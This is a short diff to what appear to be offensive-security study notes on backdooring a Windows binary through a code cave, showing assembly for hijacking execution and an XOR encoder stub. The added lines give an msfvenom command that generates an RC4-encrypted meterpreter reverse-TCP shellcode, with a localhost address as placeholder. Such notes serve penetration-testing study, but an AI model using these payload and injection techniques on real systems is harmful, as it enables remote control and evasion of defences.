@@ -115,6 +115,11 @@ POPAD                  # Restore the original flag values
 CALL dddd32.0041B7DE   # The first instruction we overwrote (hijack) 
 JMP 00411363           # Jump to the command that was to be executed next
 ```
+# This guy
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 --encrypt rc4 --encrypt-key thisiskey -f c
+```
+
 # XOR Stub Syntax
 ```
 0040A770   MOV EAX, 004050ca         # Save start of encoding address in EAX 
